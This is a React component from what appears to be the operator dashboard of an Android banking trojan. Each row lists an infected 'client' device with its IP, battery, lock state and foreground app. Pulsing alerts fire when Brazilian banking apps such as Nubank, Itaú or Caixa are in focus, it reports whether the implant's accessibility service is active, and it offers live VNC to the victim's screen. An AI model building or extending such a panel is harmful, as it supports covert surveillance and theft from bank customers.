import { memo, type MouseEvent } from 'react';
import type { Cliente } from '@/types/dashboard';
import LatencyBadge from './LatencyBadge';
import { Lock, Unlock, Eye, Trash2, Smartphone, Zap, Activity, Radio, ChevronRight, Battery, BatteryCharging, Globe, ShieldCheck, ShieldAlert, Wifi, Signal } from 'lucide-react';
import { useTranslation } from '../../utils/i18n';

interface DeviceRowProps {
  cliente: Cliente;
  onClick: () => void;
  onContextMenu: (event: MouseEvent) => void;
  onDeleteDevice?: (cliente: Cliente) => void;
  onOpenVnc?: (cliente: Cliente) => void;
}

function getNetworkBadge(netType?: string | null) {
  if (!netType) return { name: 'Wi-Fi', isWifi: true, is4g: false };
  const n = netType.toLowerCase();
  if (n.includes('wifi') || n.includes('wi-fi') || n.includes('wlan')) {
    return { name: 'Wi-Fi', isWifi: true, is4g: false };
  }
  if (n.includes('5g')) {
    return { name: '5G', isWifi: false, is4g: true };
  }
  if (n.includes('4g') || n.includes('lte') || n.includes('cellular') || n.includes('mobile')) {
    return { name: '4G', isWifi: false, is4g: true };
  }
  if (n.includes('3g') || n.includes('2g')) {
    return { name: '3G', isWifi: false, is4g: true };
  }
  return { name: 'Wi-Fi', isWifi: true, is4g: false };
}

function getBrandBadge(pkg?: string) {
  if (!pkg) return null;
  const p = pkg.toLowerCase();
  if (p.includes('nubank') || p.includes('nu.production')) return { name: 'NUBANK', color: 'bg-purple-600/30 text-purple-300 border-purple-500/40' };
  if (p.includes('bradesco')) return { name: 'BRADESCO', color: 'bg-red-600/30 text-red-300 border-red-500/40' };
  if (p.includes('itau')) return { name: 'ITAÚ', color: 'bg-orange-600/30 text-orange-300 border-orange-500/40' };
  if (p.includes('santander')) return { name: 'SANTANDER', color: 'bg-red-700/30 text-red-200 border-red-600/40' };
  if (p.includes('inter')) return { name: 'INTER', color: 'bg-orange-500/30 text-orange-200 border-orange-400/40' };
  if (p.includes('caixa')) return { name: 'CAIXA', color: 'bg-blue-600/30 text-blue-300 border-blue-500/40' };
  if (p.includes('c6')) return { name: 'C6 BANK', color: 'bg-[#242424] text-amber-300 border-amber-500/40' };
  if (p.includes('pagseguro') || p.includes('pagbank')) return { name: 'PAGBANK', color: 'bg-emerald-600/30 text-emerald-300 border-emerald-500/40' };
  if (p.includes('mercadopago')) return { name: 'MERCADO PAGO', color: 'bg-sky-600/30 text-sky-300 border-sky-500/40' };
  if (p.includes('picpay')) return { name: 'PICPAY', color: 'bg-emerald-500/30 text-emerald-200 border-emerald-400/40' };
  return { name: 'BANCO DETECTADO', color: 'bg-red-600/30 text-red-300 border-red-500/50' };
}

function getBrandLogo(modelName: string) {
  const m = modelName.toLowerCase();
  if (m.includes('samsung')) return { label: 'SAMSUNG', color: 'bg-blue-950/90 text-blue-300 border-blue-500/50 shadow-[0_0_8px_rgba(220,38,38,0.3)]' };
  if (m.includes('motorola') || m.includes('moto')) return { label: 'MOTOROLA', color: 'bg-cyan-950/90 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]' };
  if (m.includes('xiaomi') || m.includes('redmi') || m.includes('poco')) return { label: 'XIAOMI', color: 'bg-orange-950/90 text-orange-300 border-orange-500/50 shadow-[0_0_8px_rgba(245,158,11,0.3)]' };
  if (m.includes('windows') || m.includes('pc')) return { label: 'WINDOWS PC', color: 'bg-sky-950/90 text-sky-300 border-sky-500/50 shadow-[0_0_8px_rgba(255,107,107,0.3)]' };
  if (m.includes('apple') || m.includes('iphone')) return { label: 'IPHONE', color: 'bg-slate-800/90 text-slate-200 border-slate-400/50 shadow-[0_0_8px_rgba(225,213,203,0.3)]' };
  return { label: 'ANDROID', color: 'bg-cyan-950/90 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]' };
}

function DeviceRow({ cliente, onClick, onContextMenu, onDeleteDevice, onOpenVnc }: DeviceRowProps) {
  const { t } = useTranslation();
  const isOnline = cliente.status === 'online';
  const bankInfo = cliente.activeBank ? getBrandBadge(cliente.activeBank.package) : null;
  const brandBadge = getBrandLogo(cliente.modelName);
  const isWindows = cliente.modelName.toLowerCase().includes('windows') || cliente.modelName.toLowerCase().includes('pc:');

  const hasBattery = typeof cliente.batteryLevel === 'number' && !isNaN(cliente.batteryLevel);
  const batteryVal = hasBattery ? cliente.batteryLevel! : 100;
  const isCharging = !!cliente.isCharging;

  let batteryBgClass = 'bg-cyan-950/80 text-cyan-300 border-cyan-400/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]';
  if (isCharging) {
    batteryBgClass = 'bg-amber-950/90 text-amber-300 border-amber-400/70 shadow-[0_0_15px_rgba(245,158,11,0.4)] animate-pulse';
  } else if (!hasBattery) {
    batteryBgClass = 'bg-cyan-950/80 text-cyan-300 border-cyan-400/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]';
  } else if (batteryVal > 50) {
    batteryBgClass = 'bg-cyan-950/90 text-cyan-300 border-cyan-400/60 shadow-[0_0_14px_rgba(239,68,68,0.35)]';
  } else if (batteryVal > 20) {
    batteryBgClass = 'bg-amber-950/90 text-amber-300 border-amber-400/60 shadow-[0_0_14px_rgba(245,158,11,0.35)]';
  } else {
    batteryBgClass = 'bg-red-950/90 text-red-300 border-red-400/70 shadow-[0_0_18px_rgba(239,68,68,0.5)] animate-pulse';
  }

  return (
    <tr
      onClick={onClick}
      onContextMenu={onContextMenu}
      className={`group cursor-pointer transition-all duration-300 relative bg-gradient-to-r from-[#380b03]/90 via-[#480f03]/85 to-[#2a0803]/90 shadow-[0_8px_30px_rgba(0,0,0,0.65)] hover:shadow-[0_0_35px_rgba(239,68,68,0.35)] hover:scale-[1.006] ${
        isOnline
          ? 'hover:from-[#541203]/95 hover:to-[#3c0b03]/95'
          : 'opacity-60 hover:opacity-95'
      }`}
    >
      {/* 1. STATUS & LATÊNCIA COM FAIXA LATERAL E GLOW ANIMADO */}
      <td className="px-5 py-4.5 whitespace-nowrap first:rounded-l-2xl border-y border-l border-cyan-500/30 group-hover:border-cyan-300">
        <div className="flex items-center gap-3">
          {/* Faixa vertical de status */}
          <div className={`w-1.5 h-10 rounded-full transition-all ${
            isOnline 
              ? 'bg-gradient-to-b from-cyan-400 to-blue-500 shadow-[0_0_12px_rgba(239,68,68,0.9)]' 
              : 'bg-slate-700'
          }`}></div>

          <div className="relative flex items-center justify-center">
            {isOnline ? (
              <>
                <span className="absolute w-5 h-5 rounded-full bg-cyan-400/50 animate-ping" />
                <span className="w-3.5 h-3.5 rounded-full bg-gradient-to-tr from-cyan-400 to-blue-400 shadow-[0_0_15px_rgba(239,68,68,1)] relative z-10" />
              </>
            ) : (
              <span className="w-3 h-3 rounded-full bg-slate-600 border border-slate-500 relative z-10" />
            )}
          </div>
          <LatencyBadge lastActivityAt={cliente.lastActivityAt} isOnline={isOnline} />
        </div>
      </td>

      {/* 2. APARELHO / MODELO + BADGE DA MARCA & BATERIA */}
      <td className="px-5 py-4.5 whitespace-nowrap border-y border-cyan-500/30 group-hover:border-cyan-300">
        <div className="flex items-center gap-3.5">
          <div className={`p-3 rounded-2xl border transition-all ${
            isOnline 
              ? 'bg-gradient-to-br from-blue-950/90 to-cyan-950/90 border-cyan-500/50 text-cyan-300 group-hover:border-cyan-300 group-hover:shadow-[0_0_20px_rgba(239,68,68,0.4)]' 
              : 'bg-slate-900/90 border-slate-800 text-slate-500'
          }`}>
            {isWindows ? <Radio className="w-5 h-5 text-sky-400" /> : <Smartphone className="w-5 h-5 text-cyan-300" />}
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              {/* Badge da Marca */}
              <span className={`px-2 py-0.5 text-[9px] font-black font-mono uppercase rounded-md border ${brandBadge.color}`}>
                {brandBadge.label}
              </span>

              <span className="text-white font-black text-sm tracking-wide block font-mono group-hover:text-cyan-200 transition-colors">
                {cliente.modelName}
              </span>

              {/* 🔋 Nível de Bateria */}
              <span 
                className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-xl text-xs font-black border font-mono transition-transform hover:scale-105 ${batteryBgClass}`} 
                title={hasBattery ? `Bateria: ${batteryVal}% ${isCharging ? '(Carregando ⚡)' : ''}` : 'Bateria em sincronia'}
              >
                {isCharging ? (
                  <BatteryCharging className="w-4 h-4 text-amber-300 animate-pulse" />
                ) : (
                  <Battery className="w-4 h-4" />
                )}
                <span>{hasBattery ? `${batteryVal}%` : '⚡ ON'}</span>
              </span>
            </div>
            <div className="flex items-center gap-2 text-[11px] text-cyan-300/60 font-mono mt-1 flex-wrap">
              <span className="bg-slate-900/80 px-2 py-0.5 rounded border border-slate-800/80">ID: {cliente.deviceId.substring(0, 14)}...</span>
            </div>
          </div>
        </div>
      </td>

      {/* 3. ATIVIDADE / APP EM FOCO (DESTAQUE PARA BANCOS & TELA) */}
      <td className="px-5 py-4.5 whitespace-nowrap border-y border-cyan-500/30 group-hover:border-cyan-300">
        {isOnline ? (
          <div className="flex items-center gap-2.5">
            {/* Indicador de Bloqueio/Tela */}
            {cliente.isLocked ? (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-xl text-xs font-black uppercase tracking-wider bg-red-950/80 text-red-300 border border-red-500/50 shadow-[0_0_12px_rgba(239,68,68,0.4)] font-mono">
                <Lock className="w-3.5 h-3.5 text-red-400 animate-pulse" />
                {t('row.locked')}
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-xl text-xs font-black uppercase tracking-wider bg-cyan-950/80 text-cyan-300 border border-cyan-500/50 shadow-[0_0_12px_rgba(239,68,68,0.35)] font-mono">
                <Unlock className="w-3.5 h-3.5 text-cyan-400" />
                {t('row.free')}
              </span>
            )}

            {/* App Bancário Ativo (Alerta Neon Pulsante) */}
            {bankInfo ? (
              <span className={`px-3 py-1 text-xs font-black uppercase rounded-xl border animate-pulse shadow-lg inline-flex items-center gap-2 font-mono ${bankInfo.color}`}>
                <span className="w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
                🏦 {bankInfo.name} IN FOCUS
              </span>
            ) : cliente.foregroundApp ? (
              <span className="inline-flex items-center gap-2 px-3 py-1 rounded-xl text-xs font-bold bg-cyan-950/70 text-cyan-200 border border-cyan-500/40 shadow-[0_0_10px_rgba(239,68,68,0.2)] font-mono">
                <Eye className="w-4 h-4 text-cyan-400" />
                {cliente.foregroundApp}
              </span>
            ) : (
              <span className="text-cyan-300/50 text-xs italic font-mono flex items-center gap-1.5">
                <Activity className="w-3.5 h-3.5 text-cyan-400/50" />
                {t('row.waiting_focus')}
              </span>
            )}
          </div>
        ) : (
          <span className="text-slate-600 text-xs italic font-mono">{t('row.inactive')}</span>
        )}
      </td>

      {/* 4. IP DE ORIGEM & REDE (WI-FI / 4G) */}
      <td className="px-5 py-4.5 whitespace-nowrap border-y border-cyan-500/30 group-hover:border-cyan-300">
        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 text-xs font-black font-mono text-cyan-300 bg-cyan-950/80 border border-cyan-500/40 px-2.5 py-1 rounded-lg shadow-[0_0_8px_rgba(239,68,68,0.2)]">
            <Globe className="w-3.5 h-3.5 text-cyan-400" />
            🇧🇷 BR
          </span>
          <span className="text-cyan-200 font-mono text-xs font-black px-3 py-1 rounded-xl bg-[#1b0503] border border-cyan-500/40 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
            {cliente.ip || '192.168.1.10'}
          </span>

          {/* 📶 Indicador de Conexão */}
          {(() => {
            const net = getNetworkBadge(cliente.networkType);
            return (
              <span 
                className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-black font-mono border ${
                  net.isWifi 
                    ? 'bg-sky-950/90 text-sky-200 border-sky-400/70 shadow-[0_0_10px_rgba(255,107,107,0.35)]' 
                    : 'bg-blue-950/90 text-blue-200 border-blue-400/70 shadow-[0_0_10px_rgba(220,38,38,0.35)]'
                }`}
                title={`Conexão do Aparelho: ${net.name}`}
              >
                {net.isWifi ? <Wifi className="w-3.5 h-3.5 text-sky-300" /> : <Signal className="w-3.5 h-3.5 text-blue-300" />}
                <span>{net.name}</span>
              </span>
            );
          })()}
        </div>
      </td>

      {/* 5. SISTEMA OPERACIONAL & ACESSIBILIDADE DO NOSSO APP */}
      <td className="px-5 py-4.5 whitespace-nowrap border-y border-cyan-500/30 group-hover:border-cyan-300">
        <div className="flex items-center gap-2.5">
          <span className="inline-flex items-center gap-1.5 bg-blue-950/60 border border-blue-500/40 rounded-xl px-3 py-1 text-xs text-cyan-200 font-bold font-mono shadow-[0_0_8px_rgba(220,38,38,0.2)]">
            <Zap className="w-4 h-4 text-cyan-400 animate-pulse" />
            {cliente.androidVersion || 'Android'}
          </span>

          {/* Status de Acessibilidade */}
          {cliente.accessibilityActive ? (
            <span className="inline-flex items-center gap-1.5 bg-cyan-950/90 border border-cyan-400/60 text-cyan-200 font-black font-mono text-xs px-3 py-1 rounded-xl shadow-[0_0_15px_rgba(239,68,68,0.4)]">
              <ShieldCheck className="w-4 h-4 text-cyan-300 animate-pulse" />
              <span>ACESSIBILIDADE ATIVA</span>
            </span>
          ) : (
            <span className="inline-flex items-center gap-1.5 bg-slate-900 border border-slate-800 text-slate-500 font-bold font-mono text-xs px-3 py-1 rounded-xl">
              <ShieldAlert className="w-4 h-4 text-slate-500" />
              <span>ACESSIBILIDADE INATIVA</span>
            </span>
          )}
        </div>
      </td>

      {/* 6. RECURSOS / STATUS & BOTÃO DE AÇÃO */}
      <td className="px-5 py-4.5 whitespace-nowrap text-right last:rounded-r-2xl border-y border-r border-cyan-500/30 group-hover:border-cyan-300">
        <div className="flex items-center justify-end gap-2.5">
          <div className="flex flex-wrap gap-1.5 items-center">
            {cliente.badges.map((badge) => {
              const isVncBadge = badge.toUpperCase() === 'VNC';
              return (
                <button
                  key={badge}
                  type="button"
                  onClick={(e) => {
                    if (onOpenVnc) {
                      e.stopPropagation();
                      onOpenVnc(cliente);
                    }
                  }}
                  className={`px-2.5 py-1 rounded-lg border text-xs font-black uppercase font-mono transition-all ${
                    isVncBadge
                      ? 'bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white border-cyan-400 shadow-[0_0_12px_rgba(255,43,43,0.4)] cursor-pointer active:scale-95'
                      : 'bg-cyan-950/70 text-cyan-300 border-cyan-500/50 shadow-sm'
                  }`}
                  title={isVncBadge ? "Abrir Transmissão VNC Direta" : undefined}
                >
                  {badge}
                </button>
              );
            })}

            {onOpenVnc && (
              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  onOpenVnc(cliente);
                }}
                className="px-3.5 py-1.5 bg-gradient-to-r from-cyan-500 via-blue-600 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-white text-xs font-black font-mono uppercase tracking-wider rounded-xl border border-cyan-300/60 shadow-[0_0_18px_rgba(239,68,68,0.5)] transition-all transform hover:scale-105 active:scale-95 flex items-center gap-1.5 cursor-pointer"
                title="Abrir VNC Ao Vivo na Tela Sem Entrar no Cliente"
              >
                <span>📺 {t('row.view_vnc')}</span>
              </button>
            )}
          </div>

          <div className="p-2 rounded-xl bg-blue-950/80 border border-cyan-500/40 text-cyan-300 group-hover:bg-gradient-to-r group-hover:from-cyan-500 group-hover:to-blue-600 group-hover:text-white group-hover:border-cyan-300 transition-all shadow-md group-hover:shadow-[0_0_15px_rgba(239,68,68,0.5)]">
            <ChevronRight className="w-4.5 h-4.5 group-hover:translate-x-0.5 transition-transform" />
          </div>

          {!isOnline && onDeleteDevice && (
            <button
              type="button"
              onClick={(e) => {
                e.stopPropagation();
                onDeleteDevice(cliente);
              }}
              className="p-1.5 text-slate-500 hover:text-red-400 hover:bg-red-950/60 rounded-xl border border-transparent hover:border-red-500/40 transition-all cursor-pointer"
              title="Excluir dispositivo offline"
            >
              <Trash2 className="w-4 h-4" />
            </button>
          )}
        </div>
      </td>
    </tr>
  );
}

function rowPropsEqual(prev: DeviceRowProps, next: DeviceRowProps): boolean {
  const a = prev.cliente;
  const b = next.cliente;
  return (
    a.deviceId === b.deviceId &&
    a.status === b.status &&
    a.ip === b.ip &&
    a.modelName === b.modelName &&
    a.androidVersion === b.androidVersion &&
    a.lastActivityAt === b.lastActivityAt &&
    a.isLocked === b.isLocked &&
    a.isScreenOn === b.isScreenOn &&
    a.foregroundApp === b.foregroundApp &&
    a.foregroundPackage === b.foregroundPackage &&
    a.batteryLevel === b.batteryLevel &&
    a.isCharging === b.isCharging &&
    a.accessibilityActive === b.accessibilityActive &&
    a.country === b.country &&
    a.activeBank?.package === b.activeBank?.package &&
    Math.round(a.latencyMs / 1000) === Math.round(b.latencyMs / 1000) &&
    a.badges.join(',') === b.badges.join(',')
  );
}

export default memo(DeviceRow, rowPropsEqual);
